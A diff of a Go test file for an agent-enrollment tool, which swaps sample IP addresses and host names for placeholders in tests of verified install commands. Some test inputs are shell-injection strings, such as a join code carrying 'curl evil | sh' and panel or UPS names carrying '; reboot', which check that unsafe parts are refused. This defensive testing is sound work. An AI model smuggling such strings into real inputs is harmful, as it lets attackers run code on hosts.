@@ -185,19 +185,19 @@ func TestVerifierHostsAndRetry(t *testing.T) {
 
 // Create shows no code and no command without a checked script.
 func TestCreateNeedsCheckedScript(t *testing.T) {
-	m := &Manager{PanelAddr: "100.88.109.47", items: map[string]*Enrollment{}, Hooks: Hooks{Config: func() *config.Panel { return &config.Panel{} }}}
-	req := Request{Name: "nsx-furina", OS: "linux"}
-	_, err := m.Create(context.Background(), req, &managed.Host{ID: "nsx-furina", Name: "nsx-furina", OS: "linux"}, "neptune", nil)
+	m := &Manager{PanelAddr: "100.64.0.10", items: map[string]*Enrollment{}, Hooks: Hooks{Config: func() *config.Panel { return &config.Panel{} }}}
+	req := Request{Name: "srv-winpc", OS: "linux"}
+	_, err := m.Create(context.Background(), req, &managed.Host{ID: "srv-winpc", Name: "srv-winpc", OS: "linux"}, "alice", nil)
 	var u *Unavailable
 	if !errors.As(err, &u) || len(m.items) != 0 {
 		t.Fatal("no script source:", err)
 	}
 	m.Scripts = PinnedVerifier("n3ptune-cpu/Fairy-agent", "", nil) // a build without the release key
-	if _, err := m.Create(context.Background(), req, &managed.Host{ID: "nsx-furina", Name: "nsx-furina", OS: "linux"}, "neptune", nil); !errors.As(err, &u) || len(m.items) != 0 {
+	if _, err := m.Create(context.Background(), req, &managed.Host{ID: "srv-winpc", Name: "srv-winpc", OS: "linux"}, "alice", nil); !errors.As(err, &u) || len(m.items) != 0 {
 		t.Fatal("no key:", err)
 	}
 	m.Scripts = Fixed{Base: "https://github.com/x/y/releases/download/build-7; curl evil", SH: testInstallers.SH, PS1: testInstallers.PS1}
-	if _, err := m.Create(context.Background(), req, &managed.Host{ID: "nsx-furina", Name: "nsx-furina", OS: "linux"}, "neptune", nil); !errors.As(err, &u) {
+	if _, err := m.Create(context.Background(), req, &managed.Host{ID: "srv-winpc", Name: "srv-winpc", OS: "linux"}, "alice", nil); !errors.As(err, &u) {
 		t.Fatal("unsafe base accepted:", err)
 	}
 }
@@ -206,35 +206,35 @@ func TestCreateNeedsCheckedScript(t *testing.T) {
 // (Fairy-agent reports/A4, "Install command lines"; pinned there by pkg/release/deploy_test.go).
 func TestCommandsPinTheCheckedRelease(t *testing.T) {
 	const base = "https://github.com/n3ptune-cpu/Fairy-agent/releases/download/build-7"
-	win := Command(testInstallers, managed.Host{OS: "windows", Options: managed.Options{PowerControl: true, UPSName: "ups1"}}, testCode, "100.88.109.47")
+	win := Command(testInstallers, managed.Host{OS: "windows", Options: managed.Options{PowerControl: true, UPSName: "ups1"}}, testCode, "100.64.0.10")
 	want := `$u='` + base + `'; $b=(New-Object Net.WebClient).DownloadData("$u/install.ps1"); ` +
 		`if ((([Security.Cryptography.SHA256]::Create().ComputeHash($b) | ForEach-Object { $_.ToString('x2') }) -join '') -ne '` + testInstallers.PS1 + `') ` +
 		`{ throw 'install.ps1 is not the release the panel checked: not run' }; ` +
 		`$env:FAIRY_JOIN_CODE='` + testCode + `'; & ([scriptblock]::Create([Text.Encoding]::UTF8.GetString($b))) -ReleaseUrl $u -SumsSha256 ` + testInstallers.Sums +
-		` -PanelAddress 100.88.109.47 -PairV2 -PowerControl -UpsName ups1`
+		` -PanelAddress 100.64.0.10 -PairV2 -PowerControl -UpsName ups1`
 	if win != want {
 		t.Fatalf("\n got %s\nwant %s", win, want)
 	}
-	lin := Command(testInstallers, managed.Host{OS: "linux", Options: managed.Options{SelfUpdate: true}}, testCode, "100.88.109.47")
+	lin := Command(testInstallers, managed.Host{OS: "linux", Options: managed.Options{SelfUpdate: true}}, testCode, "100.64.0.10")
 	want = `f=$(mktemp) && curl -fsSL --proto '=https' -o "$f" ` + base + `/install.sh && ` +
 		`echo "` + testInstallers.SH + `  $f" | sha256sum -c - && printf '%s' '` + testCode + `' | sudo env FAIRY_RELEASE_URL=` + base +
-		` sh "$f" --sums-sha256 ` + testInstallers.Sums + ` --join-stdin --pair-v2 --panel 100.88.109.47 --self-update`
+		` sh "$f" --sums-sha256 ` + testInstallers.Sums + ` --join-stdin --pair-v2 --panel 100.64.0.10 --self-update`
 	if lin != want {
 		t.Fatalf("\n got %s\nwant %s", lin, want)
 	}
 	// a Proxmox node: a root shell, the same line without sudo
-	node := Command(testInstallers, managed.Host{OS: "linux", ProxmoxWanted: true}, testCode, "100.88.109.47")
+	node := Command(testInstallers, managed.Host{OS: "linux", ProxmoxWanted: true}, testCode, "100.64.0.10")
 	if node != strings.Replace(strings.Replace(want, "| sudo env ", "| env ", 1), " --self-update", " --proxmox", 1) {
 		t.Fatal(node)
 	}
 	// every option, in the order the scripts' usage lines give
 	all := managed.Options{PowerControl: true, SelfUpdate: true, WolRelay: true, UPS: true, CoreTemp: true, IPMI: true}
-	if c := Command(testInstallers, managed.Host{OS: "linux", ProxmoxWanted: true, Options: all}, testCode, "100.88.109.47"); !strings.HasSuffix(c,
-		" --panel 100.88.109.47 --power-control --self-update --wol --ipmi --proxmox --ups") {
+	if c := Command(testInstallers, managed.Host{OS: "linux", ProxmoxWanted: true, Options: all}, testCode, "100.64.0.10"); !strings.HasSuffix(c,
+		" --panel 100.64.0.10 --power-control --self-update --wol --ipmi --proxmox --ups") {
 		t.Fatal(c)
 	}
-	if c := Command(testInstallers, managed.Host{OS: "windows", Options: all}, testCode, "100.88.109.47"); !strings.HasSuffix(c,
-		" -PanelAddress 100.88.109.47 -PairV2 -PowerControl -SelfUpdate -Wol -CoreTemp -Ipmi -Ups") {
+	if c := Command(testInstallers, managed.Host{OS: "windows", Options: all}, testCode, "100.64.0.10"); !strings.HasSuffix(c,
+		" -PanelAddress 100.64.0.10 -PairV2 -PowerControl -SelfUpdate -Wol -CoreTemp -Ipmi -Ups") {
 		t.Fatal(c)
 	}
 	for _, c := range []string{win, lin, node} {
@@ -252,7 +252,7 @@ func TestCommandKeepsTheJoinCodeOffCommandLines(t *testing.T) {
 	for _, os := range []string{"linux", "windows"} {
 		for _, node := range []bool{false, true} {
 			h := managed.Host{OS: os, ProxmoxWanted: node && os == "linux", Options: managed.Options{PowerControl: true, UPSName: "ups1"}}
-			c := Command(testInstallers, h, testCode, "100.88.109.47")
+			c := Command(testInstallers, h, testCode, "100.64.0.10")
 			if strings.Count(c, testCode) != 1 {
 				t.Fatalf("the code must be in the line exactly once: %s", c)
 			}
@@ -277,7 +277,7 @@ func TestCommandKeepsTheJoinCodeOffCommandLines(t *testing.T) {
 // L29: the Windows line keeps no file between checking the script and running it: it downloads into memory,
 // hashes those bytes and runs those bytes. No temp file, no second PowerShell given a path.
 func TestWindowsCommandRunsTheCheckedBytesFromMemory(t *testing.T) {
-	c := Command(testInstallers, managed.Host{OS: "windows"}, testCode, "100.88.109.47")
+	c := Command(testInstallers, managed.Host{OS: "windows"}, testCode, "100.64.0.10")
 	for _, gone := range []string{"$env:TEMP", "fairy-install.ps1", "-OutFile", "Get-FileHash", "iwr ", "Invoke-WebRequest", "-File", "$f"} {
 		if strings.Contains(c, gone) {
 			t.Errorf("the line still uses %q: %s", gone, c)
@@ -303,20 +303,20 @@ func TestWindowsCommandRunsTheCheckedBytesFromMemory(t *testing.T) {
 // name with other characters, an unchecked release, or a release whose script cannot take the new line.
 func TestCommandRefusesUnsafeParts(t *testing.T) {
 	ok := managed.Host{OS: "linux"}
-	if Command(testInstallers, ok, testCode, "100.88.109.47") == "" {
+	if Command(testInstallers, ok, testCode, "100.64.0.10") == "" {
 		t.Fatal("the plain case")
 	}
 	for name, c := range map[string]string{
-		"code with a quote":       Command(testInstallers, ok, "MFRG-GZDF-MZTW-Q2LK-NNWG-23TP-OBYX-E43'", "100.88.109.47"),
-		"code with a command":     Command(testInstallers, ok, "x'; curl evil | sh; '", "100.88.109.47"),
-		"code without dashes":     Command(testInstallers, ok, "MFRGGZDFMZTWQ2LKNNWG23TPOBYXE43U", "100.88.109.47"),
-		"lower-case code":         Command(testInstallers, ok, strings.ToLower(testCode), "100.88.109.47"),
-		"empty code":              Command(testInstallers, ok, "", "100.88.109.47"),
-		"panel with a command":    Command(testInstallers, ok, testCode, "100.88.109.47; reboot"),
+		"code with a quote":       Command(testInstallers, ok, "MFRG-GZDF-MZTW-Q2LK-NNWG-23TP-OBYX-E43'", "100.64.0.10"),
+		"code with a command":     Command(testInstallers, ok, "x'; curl evil | sh; '", "100.64.0.10"),
+		"code without dashes":     Command(testInstallers, ok, "MFRGGZDFMZTWQ2LKNNWG23TPOBYXE43U", "100.64.0.10"),
+		"lower-case code":         Command(testInstallers, ok, strings.ToLower(testCode), "100.64.0.10"),
+		"empty code":              Command(testInstallers, ok, "", "100.64.0.10"),
+		"panel with a command":    Command(testInstallers, ok, testCode, "100.64.0.10; reboot"),
 		"panel as a name":         Command(testInstallers, ok, testCode, "panel.example.com"),
 		"panel IPv6":              Command(testInstallers, ok, testCode, "fd7a:115c:a1e0::5"),
-		"UPS name with a command": Command(testInstallers, managed.Host{OS: "linux", Options: managed.Options{UPSName: "ups1; reboot"}}, testCode, "100.88.109.47"),
-		"UPS name, PowerShell":    Command(testInstallers, managed.Host{OS: "windows", Options: managed.Options{UPSName: "u'; calc; '"}}, testCode, "100.88.109.47"),
+		"UPS name with a command": Command(testInstallers, managed.Host{OS: "linux", Options: managed.Options{UPSName: "ups1; reboot"}}, testCode, "100.64.0.10"),
+		"UPS name, PowerShell":    Command(testInstallers, managed.Host{OS: "windows", Options: managed.Options{UPSName: "u'; calc; '"}}, testCode, "100.64.0.10"),
 	} {
 		if c != "" {
 			t.Errorf("%s: a line was made: %s", name, c)
@@ -332,13 +332,13 @@ func TestCommandRefusesUnsafeParts(t *testing.T) {
 	} {
 		in := testInstallers
 		change(&in)
-		if l, w := Command(in, managed.Host{OS: "linux"}, testCode, "100.88.109.47"), Command(in, managed.Host{OS: "windows"}, testCode, "100.88.109.47"); l != "" || w != "" {
+		if l, w := Command(in, managed.Host{OS: "linux"}, testCode, "100.64.0.10"), Command(in, managed.Host{OS: "windows"}, testCode, "100.64.0.10"); l != "" || w != "" {
 			t.Errorf("%s: a line was made:\n%s\n%s", name, l, w)
 		}
 	}
 	in := testInstallers
 	in.MemoryPS1 = false // only Windows needs it
-	if Command(in, managed.Host{OS: "windows"}, testCode, "100.88.109.47") != "" || Command(in, managed.Host{OS: "linux"}, testCode, "100.88.109.47") == "" {
+	if Command(in, managed.Host{OS: "windows"}, testCode, "100.64.0.10") != "" || Command(in, managed.Host{OS: "linux"}, testCode, "100.64.0.10") == "" {
 		t.Error("install.ps1 that cannot run from memory")
 	}
 }
@@ -372,7 +372,7 @@ func TestLinuxCommandRunsOnlyTheCheckedScript(t *testing.T) {
 	script := []byte("#!/bin/sh\necho \"$FAIRY_RELEASE_URL $*\" > \"" + marker + "\"\nIFS= read -r CODE || [ -n \"$CODE\" ]\nprintf '%s' \"$CODE\" > \"" + stdin + "\"\n")
 	in := testInstallers
 	in.SH = hexSum(script)
-	cmd := Command(in, managed.Host{OS: "linux", ProxmoxWanted: true}, testCode, "100.88.109.47")
+	cmd := Command(in, managed.Host{OS: "linux", ProxmoxWanted: true}, testCode, "100.64.0.10")
 	run := func() (string, error) {
 		os.Remove(marker)
 		os.Remove(stdin)
@@ -401,7 +401,7 @@ func TestLinuxCommandRunsOnlyTheCheckedScript(t *testing.T) {
 		t.Fatal(err, out)
 	}
 	got, _ := os.ReadFile(marker)
-	if string(got) != in.Base+" --sums-sha256 "+in.Sums+" --join-stdin --pair-v2 --panel 100.88.109.47 --proxmox\n" {
+	if string(got) != in.Base+" --sums-sha256 "+in.Sums+" --join-stdin --pair-v2 --panel 100.64.0.10 --proxmox\n" {
 		t.Fatalf("%q", got)
 	}
 	if code, _ := os.ReadFile(stdin); string(code) != testCode {
@@ -439,17 +439,17 @@ func TestCommandsPassTheVerifiedSumsHash(t *testing.T) {
 	if !in.PinSH || !in.PinPS1 || in.Sums != sums || len(in.Lacks("linux")) != 0 || len(in.Lacks("windows")) != 0 {
 		t.Fatalf("%+v", in)
 	}
-	lin := Command(in, managed.Host{OS: "linux"}, testCode, "100.88.109.47")
-	if !strings.Contains(lin, `sh "$f" --sums-sha256 `+sums+` --join-stdin --pair-v2 --panel 100.88.109.47`) {
+	lin := Command(in, managed.Host{OS: "linux"}, testCode, "100.64.0.10")
+	if !strings.Contains(lin, `sh "$f" --sums-sha256 `+sums+` --join-stdin --pair-v2 --panel 100.64.0.10`) {
 		t.Fatal(lin)
 	}
-	win := Command(in, managed.Host{OS: "windows"}, testCode, "100.88.109.47")
-	if !strings.Contains(win, ` -ReleaseUrl $u -SumsSha256 `+sums+` -PanelAddress 100.88.109.47 -PairV2`) {
+	win := Command(in, managed.Host{OS: "windows"}, testCode, "100.64.0.10")
+	if !strings.Contains(win, ` -ReleaseUrl $u -SumsSha256 `+sums+` -PanelAddress 100.64.0.10 -PairV2`) {
 		t.Fatal(win)
 	}
 	bad := in
 	bad.Sums = "not-a-hash; curl evil"
-	if bad.valid() || Command(bad, managed.Host{OS: "linux"}, testCode, "100.88.109.47") != "" {
+	if bad.valid() || Command(bad, managed.Host{OS: "linux"}, testCode, "100.64.0.10") != "" {
 		t.Fatal("unsafe sums hash accepted")
 	}
 	// the scripts of v0.4.3 to v0.5.x take the fingerprint but not the rest: no command
@@ -458,7 +458,7 @@ func TestCommandsPassTheVerifiedSumsHash(t *testing.T) {
 	if err != nil || !in2.PinSH || !in2.PinPS1 || len(in2.Lacks("linux")) != 2 || len(in2.Lacks("windows")) != 2 {
 		t.Fatalf("%+v %v", in2, err)
 	}
-	if Command(in2, managed.Host{OS: "linux"}, testCode, "100.88.109.47") != "" || Command(in2, managed.Host{OS: "windows"}, testCode, "100.88.109.47") != "" {
+	if Command(in2, managed.Host{OS: "linux"}, testCode, "100.64.0.10") != "" || Command(in2, managed.Host{OS: "windows"}, testCode, "100.64.0.10") != "" {
 		t.Fatal("a command for a release that cannot take it")
 	}
 }
